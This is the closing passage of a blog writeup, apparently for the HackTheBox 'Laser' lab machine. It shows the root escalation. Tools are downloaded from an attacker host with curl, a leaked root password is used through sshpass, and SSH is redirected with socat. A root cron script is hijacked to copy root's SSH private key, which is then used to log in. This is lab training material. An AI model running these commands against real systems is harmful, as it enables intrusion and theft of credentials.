<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python -m SimpleHTTPServer <span style="color:#3677a9">80</span> <span style="color:#999;font-style:italic">#on attacker machine</span>
</span></span><span style="display:flex;"><span>curl http://<span style="color:#3677a9">10.10.14.12</span>/pspy64 -o pspy64 <span style="color:#999;font-style:italic">#on victim machine</span>
</span></span><span style="display:flex;"><span>chmod +x pspy64 <span style="color:#999;font-style:italic">#on victim machine</span>
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/Docker_Pass.png" alt="DockerPass"></p>
<p>We got a passoword for root!! but it is running /tmp/clear.sh on root, something is suspicous here. Let&rsquo;s see what is it.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@<span style="color:#3677a9">172.18.0.2</span>
</span></span></code></pre></div><pre tabindex="0"><code>
![Docker_login](/images/Hackthebox/Laser/Docker_Login.png)

This is not root!!! This is docker 
So Now as it is executing the /tmp/clear.sh then we can redirect the ssh back again to us.


```python
curl http://10.10.14.12/socat -o socat #on solr shell
chmod +x socat #on solr shell
cd tmp #on solr shell
service ssh stop #on docker
./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22 #on docker
</code></pre><p>After doing this we have to change the ownership rights so that we could copy the id_rsa of root to our solr use</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cd /tmp
</span></span><span style="display:flex;"><span>echo <span style="color:#ed9d13">&#39;mkdir -p /tmp/purabparihar;cp -R /root/.ssh /tmp/purabparihar;chown -R solr:solr /tmp/purabparihar&#39;</span>&gt; /tmp/clear.sh;chmod +x /tmp/clear.sh
</span></span></code></pre></div><p>Now keep spamming ls command because the cron job could be executed any time.</p>
<p><img src="/images/Hackthebox/Laser/Cron.png" alt="Cron">
Once we got folder named purabparihar then we have grab ssh keys from root!!</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ls;cd purabparihar/.ssh;cat id_rsa
</span></span></code></pre></div><p>Now copy those ssh keys and then save it in file</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>chmod <span style="color:#3677a9">600</span> root_ssh
</span></span><span style="display:flex;"><span>ssh -i root_ssh root<span style="color:#ffa500">@laser</span>.htb
</span></span></code></pre></div><p><img src="/images/Hackthebox/Laser/root.png" alt="Root"></p>
<p><strong>Thank You Everyone for reading this blog! I hope you learned something new</strong></p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="purabparihar.github.io/tags/hackthebox/">Hackthebox</a></span>
        <span class="tag"><a href="purabparihar.github.io/tags/printer-exploitation/">Printer Exploitation</a></span>
        <span class="tag"><a href="purabparihar.github.io/tags/grpc/">gRPC</a></span>
        <span class="tag"><a href="purabparihar.github.io/tags/internal-port-scanning/">Internal Port Scanning</a></span>
        <span class="tag"><a href="purabparihar.github.io/tags/laser/">laser</a></span>
        
    </p>

      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        1297 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          13-10-2022
        

         
          
            
              (Last updated: 13-10-2022)
            
          
        
      </p>
        <p>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit">
            <circle cx="12" cy="12" r="4"></circle>
            <line x1="1.05" y1="12" x2="7" y2="12"></line>
            <line x1="17.01" y1="12" x2="22.96" y2="12"></line>
          </svg>

          <a href="636f3884833fa9f954d02c4123604f988b23aa03" target="_blank" rel="noopener">636f388</a>
          @ 13-10-2022
        </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup&amp;caption=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup&amp;canonicalUrl=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup&amp;body=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f&amp;media=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f;description=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f&amp;title=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup&amp;summary=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup&amp;source=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f&amp;resubmit=true&amp;title=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f;title=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup%20purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f&amp;t=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HackTheBox%20Laser%20%3a%20Insane%20Machine%20Writeup&amp;url=purabparihar.github.io%2fposts%2fhackthebox-laser-insane-machine-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    

    

    

  </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            
            
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="purabparihar.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span><a href="http://gohugo.io">Hugo</a> theme by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/purabparihar.github.io/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>



    </body>
</html>
